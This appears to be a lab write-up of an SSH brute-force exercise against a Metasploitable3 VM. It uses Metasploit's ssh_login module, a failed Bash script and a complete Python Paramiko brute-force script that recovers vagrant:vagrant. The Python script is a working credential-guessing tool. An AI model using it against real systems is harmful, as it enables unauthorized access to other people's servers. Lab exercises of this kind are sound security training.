# Phase 1 – Vulnerability Identification and Exploitation

In this phase, we focused on identifying a vulnerability in the victim machine (Metasploitable3) and executing a brute-force SSH attack from the attacker machine (Kali Linux).  
We utilized Metasploit and a custom Python script to simulate a real-world attack and confirm successful access.

---

## Step 1: Setup the Environment

We prepared both the attacker and victim machines using VirtualBox, ensured connectivity, and verified that the SSH service on the victim machine was active and reachable.

### 1. Victim Environment Status
- Machine: Metasploitable3
- SSH Port: 22
- IP Address: 192.168.150.3

![Victim Ping & Port Status](IMG_9F82D18A-7360-49A2-8363-B3F014672D98.jpeg "Ping and Nmap scan on Metasploitable3")

---

## Step 2: Metasploit Brute-Force Attack

We used the `auxiliary/scanner/ssh/ssh_login` module in Metasploit to perform a brute-force attack on the SSH service.  
The attack successfully identified the correct credentials and opened an active session on the victim.

### 2. Successful SSH Session via Metasploit
- Credentials Used: vagrant / vagrant
- Result: Session opened and shell access granted

![Metasploit Session](IMG_7D082186-6D9F-4C94-A48A-0EFA147ECFFB.jpeg "Successful SSH session with Metasploit")

---

## Step 3: Custom Bash Script (Unsuccessful)

A Bash script was created to automate SSH login attempts using the `sshpass` tool and lists of usernames and passwords.  
Despite multiple trials, the Bash approach failed to establish a successful login due to SSH response handling limitations.

### 3. Bash Brute Force Result
![Bash Script Result](IMG_23151A07-231B-4691-BD98-E3381C03FD1A.jpeg "Bash script output showing failed attempts")

---

## Step 4: Custom Python Script (Successful)

We implemented a Python script using the Paramiko library to automate SSH brute-force attacks with improved control over responses and exceptions.

The script successfully identified the correct credentials (`vagrant:vagrant`) from the provided lists and logged in.

### 4. Python Script Used
```python
import paramiko
import socket

target_ip = "192.168.150.3"
target_port = 22

with open("usernames.txt", "r") as ufile:
    usernames = [line.strip() for line in ufile.readlines()]

with open("passwords.txt", "r") as pfile:
    passwords = [line.strip() for line in pfile.readlines()]

def ssh_connect(username, password, ip, port):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, port=port, username=username, password=password, timeout=5)
        print(f"[+] Success! Username: {username} Password: {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed login with {username}:{password}")
        return False
    except socket.error as e:
        print(f"[!] Connection error: {e}")
        return False
    finally:
        client.close()

for username in usernames:
    for password in passwords:
        if ssh_connect(username, password, target_ip, target_port):
            exit()
```

---

### 5. Successful Python Brute Force Result
![Python Script Success](IMG_BCE66EEB-F14D-4814-8350-933F0B8E619E.jpeg "Successful brute-force login using Python")

---